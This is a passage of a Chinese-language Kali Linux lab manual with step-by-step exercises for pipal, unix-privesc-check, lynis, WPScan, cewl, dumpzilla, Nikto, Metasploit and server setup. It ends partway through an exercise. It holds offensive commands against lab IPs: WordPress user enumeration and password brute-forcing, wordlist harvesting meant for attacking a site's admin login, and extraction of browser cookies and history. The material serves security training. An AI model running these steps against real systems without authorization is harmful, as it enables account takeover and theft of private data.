title="实验步骤"></a>实验步骤</h2><p>所有这些工具确实是给你的统计数据和信息，以帮助您分析密码。真正的工作是由你解释的结果进行。</p><p>查看帮助</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipal –h</span><br></pre></td></tr></table></figure><p>分析本地password.txt文件，可以分析密码文件的词频等信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipal /root/password.txt</span><br></pre></td></tr></table></figure><p>分析并显示前 5 个密码（-t 5），使用给定文件作为输入（&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;nmap.lst）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipal –t 5 /usr/share/wordlists/nmap.lst</span><br></pre></td></tr></table></figure><p><strong>实验总结</strong><br>pipal是一款词频分析工具，可以用来在字典中筛选出出现频率高的密码</p><h1 id="实验-4-漏洞分析-unix-privesc-check"><a href="#实验-4-漏洞分析-unix-privesc-check" class="headerlink" title="实验 4 漏洞分析-unix-privesc-check"></a>实验 4 漏洞分析-unix-privesc-check</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用unix-privesc-check，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016</p><p><strong>实验工具</strong></p><p>unix-privesc-check</p><p><strong>实验目的</strong></p><p>了解unix-privesc-check工具的使用</p><p><strong>实验步骤</strong></p><h2 id="1-查看帮助"><a href="#1-查看帮助" class="headerlink" title="1. 查看帮助"></a>1. 查看帮助</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix-privesc-check -h</span><br></pre></td></tr></table></figure><ul><li><code>standard</code> ：标准”模式：速度优化检查大量的安全设置。</li><li><code>detailed</code> ：“详细”模式：与标准模式相同，但也检查打开文件的perms句柄和被调用的文件（例如从shell脚本分析，链接的.so文件）。 这种模式很慢。</li></ul><h2 id="2-使用标准模式扫描本地"><a href="#2-使用标准模式扫描本地" class="headerlink" title="2. 使用标准模式扫描本地"></a>2. 使用标准模式扫描本地</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix-privesc-check standard</span><br></pre></td></tr></table></figure><h2 id="3-把报告保存到本地文件"><a href="#3-把报告保存到本地文件" class="headerlink" title="3. 把报告保存到本地文件"></a>3. 把报告保存到本地文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix-privesc-check &gt; baogao.txt</span><br></pre></td></tr></table></figure><h2 id="4-查看报告"><a href="#4-查看报告" class="headerlink" title="4. 查看报告"></a>4. 查看报告</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> baogao.txt</span><br></pre></td></tr></table></figure><p><strong>实验总结</strong></p><p>unix-privesc-check是Kali Linux自带的一款提权漏洞检测工具。它是一个Shell文件，可以检测所在系统的错误配置，以发现可以用于提权的漏洞。</p><h1 id="实验5-kali-漏洞扫描-lynis"><a href="#实验5-kali-漏洞扫描-lynis" class="headerlink" title="实验5 kali-漏洞扫描-lynis"></a>实验5 kali-漏洞扫描-lynis</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用lynis工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>lynis</p><p><strong>实验目的</strong></p><p>了解漏洞扫描工具lynis的使用</p><p><strong>实验步骤</strong></p><h2 id="1-启动lynis并列出支持的参数"><a href="#1-启动lynis并列出支持的参数" class="headerlink" title="1. 启动lynis并列出支持的参数"></a>1. 启动lynis并列出支持的参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lynis</span><br></pre></td></tr></table></figure><h2 id="2-对本地进行安全扫描"><a href="#2-对本地进行安全扫描" class="headerlink" title="2. 对本地进行安全扫描"></a>2. 对本地进行安全扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lynis audit system</span><br></pre></td></tr></table></figure><h2 id="3-查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）"><a href="#3-查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）" class="headerlink" title="3. 查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）"></a>3. 查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）</h2><p>日志保存在&#x2F;var&#x2F;log&#x2F;lynis-report.dat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep –E “^warning|^suggestion” /var/log/lynis-report.dat</span><br></pre></td></tr></table></figure><h2 id="4-检查更新"><a href="#4-检查更新" class="headerlink" title="4. 检查更新"></a>4. 检查更新</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lynis update info --no-colors</span><br></pre></td></tr></table></figure><h2 id="5-创建Lynis计划任务"><a href="#5-创建Lynis计划任务" class="headerlink" title="5. 创建Lynis计划任务"></a>5. 创建Lynis计划任务</h2><p>如果你想为你的系统创建一个日扫描报告，你可以设置cron：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>添加cron任务：</p><p><strong>实验总结</strong></p><p>观察lynis工具能否扫描出系统存在的漏洞，如果存在该如何进行加固</p><h1 id="实验6-kali-漏洞扫描-WPScan"><a href="#实验6-kali-漏洞扫描-WPScan" class="headerlink" title="实验6 kali-漏洞扫描-WPScan"></a>实验6 kali-漏洞扫描-WPScan</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用pipal工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 kali 2018<br>靶机 windows 7 192.168.163.</p><p><strong>实验工具</strong></p><p>攻击机：wpscan<br>靶机：wordpress</p><p><strong>实验目的</strong></p><p>了解wpscan的使用</p><p><strong>实验步骤</strong></p><h2 id="1-简单的攻击"><a href="#1-简单的攻击" class="headerlink" title="1. 简单的攻击"></a>1. 简单的攻击</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan –u 192.168.163.147/wordpress</span><br></pre></td></tr></table></figure><h2 id="2-列出用户名列表"><a href="#2-列出用户名列表" class="headerlink" title="2. 列出用户名列表"></a>2. 列出用户名列表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan –u 192.168.163.147/wordpress –e u vp</span><br></pre></td></tr></table></figure><h2 id="3-通过字典爆破用户密码"><a href="#3-通过字典爆破用户密码" class="headerlink" title="3. 通过字典爆破用户密码"></a>3. 通过字典爆破用户密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan –u 192.168.163.147/wordpress –e u –wordlist /root/password.txt</span><br></pre></td></tr></table></figure><h2 id="4-了解其它参数"><a href="#4-了解其它参数" class="headerlink" title="4. 了解其它参数"></a>4. 了解其它参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan – h</span><br></pre></td></tr></table></figure><p><strong>实验总结</strong></p><p>思考WPScan的作用场景是否有特定版本号要求</p><h1 id="实验-7-密码攻击-cewl"><a href="#实验-7-密码攻击-cewl" class="headerlink" title="实验 7 密码攻击-cewl"></a>实验 7 密码攻击-cewl</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用cewl工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018<br>windows 7 192.168.163.</p><p><strong>实验工具</strong></p><p>cewl</p><p><strong>实验目的</strong></p><p>掌握密码爬取工具cewl的使用</p><p><strong>实验步骤</strong></p><h2 id="1-直接在终端启动cewl"><a href="#1-直接在终端启动cewl" class="headerlink" title="1. 直接在终端启动cewl"></a>1. 直接在终端启动cewl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl –h</span><br></pre></td></tr></table></figure><h2 id="2-爬取最小单词长度为-5"><a href="#2-爬取最小单词长度为-5" class="headerlink" title="2. 爬取最小单词长度为 5"></a>2. 爬取最小单词长度为 5</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl 192.168.163.147:88 –m 5</span><br></pre></td></tr></table></figure><h2 id="3-爬取网站深度为-5-的关键字"><a href="#3-爬取网站深度为-5-的关键字" class="headerlink" title="3. 爬取网站深度为 5 的关键字"></a>3. 爬取网站深度为 5 的关键字</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl – d 5 192.168.163.147:88</span><br></pre></td></tr></table></figure><h2 id="4-收集包含emali地址信息"><a href="#4-收集包含emali地址信息" class="headerlink" title="4. 收集包含emali地址信息"></a>4. 收集包含emali地址信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl – e 192.168.163.147:88</span><br></pre></td></tr></table></figure><h2 id="5-统计每个单词出现的次数"><a href="#5-统计每个单词出现的次数" class="headerlink" title="5. 统计每个单词出现的次数"></a>5. 统计每个单词出现的次数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl 192.168.163.147:88 –c</span><br></pre></td></tr></table></figure><h2 id="6-可以多个参数一起使用"><a href="#6-可以多个参数一起使用" class="headerlink" title="6. 可以多个参数一起使用"></a>6. 可以多个参数一起使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl 192</span><br><span class="line">.168.163.147:88 -m 3 -d 3 -e -c -v -w a.txt</span><br></pre></td></tr></table></figure><h2 id="7-查看a-txt字典"><a href="#7-查看a-txt字典" class="headerlink" title="7. 查看a.txt字典"></a>7. 查看a.txt字典</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> a.txt</span><br></pre></td></tr></table></figure><p><strong>实验总结</strong></p><p>使用通过cewl工具爬取的字典文件，使用它去爆破网站的后台</p><h1 id="实验-8-取证工具-dumpzilla"><a href="#实验-8-取证工具-dumpzilla" class="headerlink" title="实验 8 取证工具-dumpzilla"></a>实验 8 取证工具-dumpzilla</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用dumpzilla工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>Dumpzilla</p><p><strong>实验目的</strong></p><p>了解取证工具Dumpzilla的使用</p><p><strong>实验步骤</strong></p><h2 id="1-查看dumpzilla工具帮助"><a href="#1-查看dumpzilla工具帮助" class="headerlink" title="1. 查看dumpzilla工具帮助"></a>1. 查看dumpzilla工具帮助</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumpzilla – h</span><br></pre></td></tr></table></figure><h2 id="2-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的历史访问记录"><a href="#2-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的历史访问记录" class="headerlink" title="2. 分析Mozilla的配置文件夹（’&#x2F;root&#x2F;.mozilla&#x2F;firefox&#x2F;4ed7jhtz.default&#x2F;‘）的历史访问记录"></a>2. 分析Mozilla的配置文件夹（’&#x2F;root&#x2F;.mozilla&#x2F;firefox&#x2F;4ed7jhtz.default&#x2F;‘）的历史访问记录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpzilla <span class="string">&#x27;/root/.mozilla/firefox/4ed7jhtz.default/&#x27;</span> –History</span><br></pre></td></tr></table></figure><h2 id="3-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的Cookies"><a href="#3-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的Cookies" class="headerlink" title="3. 分析Mozilla的配置文件夹（’&#x2F;root&#x2F;.mozilla&#x2F;firefox&#x2F;4ed7jhtz.default&#x2F;‘）的Cookies"></a>3. 分析Mozilla的配置文件夹（’&#x2F;root&#x2F;.mozilla&#x2F;firefox&#x2F;4ed7jhtz.default&#x2F;‘）的Cookies</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpzilla <span class="string">&#x27;/root/.mozilla/firefox/4ed7jhtz.default/&#x27;</span> –-Cookies</span><br></pre></td></tr></table></figure><h2 id="4-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）和转储以外的所有影像数据（-All）"><a href="#4-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）和转储以外的所有影像数据（-All）" class="headerlink" title="4. 分析Mozilla的配置文件夹（’&#x2F;root&#x2F;.mozilla&#x2F;firefox&#x2F;4ed7jhtz.default&#x2F;‘）和转储以外的所有影像数据（-All）"></a>4. 分析Mozilla的配置文件夹（’&#x2F;root&#x2F;.mozilla&#x2F;firefox&#x2F;4ed7jhtz.default&#x2F;‘）和转储以外的所有影像数据（-All）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpzilla <span class="string">&#x27;/root/.mozilla/firefox/4ed7jhtz.default/&#x27;</span> --All</span><br></pre></td></tr></table></figure><p><strong>实验总结</strong></p><p>思考dumpzilla工具除了分析本机的浏览器文件是否还能分析远程主机的配置文件。</p><h1 id="实验9-apache服务配置"><a href="#实验9-apache服务配置" class="headerlink" title="实验9 apache服务配置"></a>实验9 apache服务配置</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器安装apache服务，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016</p><p><strong>实验工具</strong></p><p>apache 2</p><p><strong>实验目的</strong></p><p>掌握kali下apache的配置</p><p><strong>实验步骤</strong></p><p>查看本机安装的apache版本号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apachectl –v</span><br></pre></td></tr></table></figure><p>启动apache服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br></pre></td></tr></table></figure><p>重启apache服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure><p>停止apache服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 stop</span><br></pre></td></tr></table></figure><p>下载默认首页并查看网页内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://127.0.0.1</span><br></pre></td></tr></table></figure><p>进入apache默认首页的目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br></pre></td></tr></table></figure><p>替换默认首页内容为 123</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;123&quot;</span> &gt; index.html</span><br></pre></td></tr></table></figure><p>重启apache服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure><p>下载默认首页</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://127.0.0.1</span><br></pre></td></tr></table></figure><p>查看下载首页内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> index.html</span><br></pre></td></tr></table></figure><p><strong>实验总结</strong></p><p>在kali上成功运行个人网页</p><h1 id="实验-10-产品安全分析工具"><a href="#实验-10-产品安全分析工具" class="headerlink" title="实验 10 产品安全分析工具"></a>实验 10 产品安全分析工具</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用glob工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali<br>靶机：centos 6.9<br>靶机ip地址：192.168.163.136</p><p><strong>实验工具</strong></p><p>glob</p><p><strong>实验目的</strong></p><p>掌握glob的使用</p><p><strong>实验步骤</strong></p><p>启动kali中cisco的安全工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cge.pl</span><br></pre></td></tr></table></figure><p>选择一个漏洞，并按照所给的格式进行测试，网址后面添加漏洞编号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cge.pl http://192.168.163.136/index.html 3</span><br></pre></td></tr></table></figure><p>CAT -h 主机名 - w 字典文件 - a 密码文件 - i</p><p>（直接在终端输入CAT直接启动，这里没有cisco设备，无法复现实验）</p><p><strong>实验总结</strong></p><p>如果有cisco设备，使用glob工具对其进行检测</p><h1 id="实验11-pure-ftpd配置"><a href="#实验11-pure-ftpd配置" class="headerlink" title="实验11 pure-ftpd配置"></a>实验11 pure-ftpd配置</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用pure-ftpd工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali</p><p><strong>实验工具</strong></p><p>pure-ftpd</p><p><strong>实验目的</strong></p><p>掌握按照和配置pure-ftpd</p><p><strong>实验步骤</strong></p><p>安装 Pure-FTPd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install pure-ftpd</span><br></pre></td></tr></table></figure><p>修改配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/pure-ftpd/conf</span><br><span class="line"><span class="built_in">echo</span> no &gt; Bind</span><br><span class="line"><span class="built_in">echo</span> no &gt; PAMAuthentication</span><br><span class="line"><span class="built_in">echo</span> no &gt; UnixAuthentication</span><br><span class="line"><span class="built_in">ln</span> -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/50 pure</span><br></pre></td></tr></table></figure><p>创建FTP服务要用到的用户组和用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd ftpgroup</span><br></pre></td></tr></table></figure><p>向创建的组里面添加新用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -g ftpgroup -d /dev/null -s /bin/false ftpuser</span><br></pre></td></tr></table></figure><p>为FTP文件新建一个目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /home/pubftp</span><br></pre></td></tr></table></figure><p>在ftp目录下新建一个测试文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test file&quot;</span> &gt; /home/pubftp/test.txt</span><br></pre></td></tr></table></figure><p>在FTP目录里面添加用户目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /home/pubftp/sam</span><br></pre></td></tr></table></figure><p>给FTP服务添加一个新的用户和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pure-pw useradd sam -u ftpuser -g ftpgroup -d /home/pubftp/sam</span><br></pre></td></tr></table></figure><p>更新Pure-FTPd的数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pure-pw mkdb</span><br></pre></td></tr></table></figure><p>启动FTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service pure-ftpd start</span><br></pre></td></tr></table></figure><p>启动FTP后，测试该服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1</span><br></pre></td></tr></table></figure><p><strong>实验总结</strong></p><p>思考这里的pure-ftpd和Linux的FTP以及vsftpd是否一样</p><h1 id="实验12-Metasploit-db-import实验"><a href="#实验12-Metasploit-db-import实验" class="headerlink" title="实验12 Metasploit-db_import实验"></a>实验12 Metasploit-db_import实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用db_import工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016<br>centos 6.9</p><p>**实验工具</p><p>**</p><p>Metasploit<br>Nmap</p><p><strong>实验目的</strong></p><p>把nmap扫描的数据导入metasploit</p><p><strong>实验步骤</strong></p><ol><li>在kali虚拟机上测试与靶机的连通性</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.133 -c 4</span><br></pre></td></tr></table></figure><ol start="2"><li>在靶机centos上测试与kali的连通性</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.134 -c 4</span><br></pre></td></tr></table></figure><ol start="3"><li>在kali上使用nmap进行局域网存活扫描并把结果保存为db.xml</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.127.0/24 -oX db.xml</span><br></pre></td></tr></table></figure><ol start="4"><li>查看刚保存的文件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> db.xml</span><br></pre></td></tr></table></figure><ol start="5"><li>在kali中启动metasploit并查看数据库中是否有数据，如果有数据使用<code>hosts -d</code>进行清空</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">hosts</span><br><span class="line">hosts -d</span><br></pre></td></tr></table></figure><ol start="6"><li>利用db_import把刚刚nmap扫描的数据导入到数据库中(注意文件路径)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db\_import /root/db.xml</span><br></pre></td></tr></table></figure><ol start="7"><li>使用<code>hosts</code>查看数据</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hosts</span><br></pre></td></tr></table></figure><ol start="8"><li>过滤出其中开启22端口的主机</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services -p 22 -c name,proto</span><br></pre></td></tr></table></figure><ol start="9"><li>过滤出开启21端口的主机</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services -p 21 -c name,proto</span><br></pre></td></tr></table></figure><p><strong>实验总结</strong></p><p>掌握msf下db_import导入数据功能的使用</p><h1 id="实验13-web扫描-Nikto"><a href="#实验13-web扫描-Nikto" class="headerlink" title="实验13 web扫描-Nikto"></a>实验13 web扫描-Nikto</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Nikto工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016</p><p><strong>实验工具</strong></p><p>Nikto</p><p><strong>实验目的</strong></p><p>掌握Nikto的使用</p><p><strong>实验步骤</strong></p><p>Nikto 是一款Perl语言开发的开源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件。</p><p>扫描内容有以下几个方面：</p><ol><li>软件版本</li><li>搜索存在安全隐患的文件（如：某些web维护人员备份完后，遗留的压缩包，若被下载下来，则获得网站源码）</li><li>服务器配置漏洞（组件可能存在默认配置）</li><li>WEB Application层面的安全隐患（XSS，SQL注入等）</li><li>避免 404 误判</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -list-plugins</span><br></pre></td></tr></table></figure><p>制定网站目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto –host http://192.168.21.128/index/</span><br></pre></td></tr></table></figure><p>指定一个或多个端口进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto –host 192.168.21.128 –port 80,443</span><br></pre></td></tr></table></figure><p>还可以进行批量扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto –host host.txt</span><br></pre></td></tr></table></figure><p>把扫描结果导成文件保存在本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto –host 192.168.21.128 –port 80 –output nikto.html</span><br></pre></td></tr></table></figure><p>用<code>cat</code>查看该文件也可以使用火狐打开该文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> nikto.html</span><br><span class="line">firefox nikto.html</span><br></pre></td></tr></table></figure><p><strong>实验总结</strong></p><p>观察Nikto的端口扫描和nmap的扫描结果是不是一样，如果不一样，谁的结果更准确一点</p><h1 id="实验-14-哈希工具Hash-Identifier"><a href="#实验-14-哈希工具Hash-Identifier" class="headerlink" title="实验 14 哈希工具Hash-Identifier"></a>实验 14 哈希工具Hash-Identifier</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Hash-Identifier<br>工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>hash-identifier</p><p><strong>实验目的</strong></p><p>了解工具的使用</p><h2 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 哈希值识别</strong></p><p>哈希值是使用HASH算法通过逻辑运算得到的数值。不同的内容使用HASH算法运算后，得到的哈希值不同。当我们拿到一段hash值时该如何去判断它是属于那种算法。</p><p>在终端中启动hash-identifier，提示输入hash值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier</span><br></pre></td></tr></table></figure><p><strong>2. 识别测试数据</strong></p><p>打开root目录下的HASH.txt文件，里面有几组测试数据，后面是hash编码。</p><ul><li>复制第一组数据到hash-identifier，判断该hash值最大可能的算法是MD5，最小可能性的是下面其它算法。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier [first\_hash\_value]</span><br></pre></td></tr></table></figure><ul><li>复制第二组数据到hash-identifier，识别结果是MD5(phpBB3)。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier [second\_hash\_value]</span><br></pre></td></tr></table></figure><ul><li>复制第三组数据到hash-identifier，识别结果是MD5(Unix)。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier [third\_hash\_value]</span><br></pre></td></tr></table></figure><ul><li>复制第四组数据到hash-identifier，识别结果是MD5（Wordpress）。</li></ul><figure class="highlight 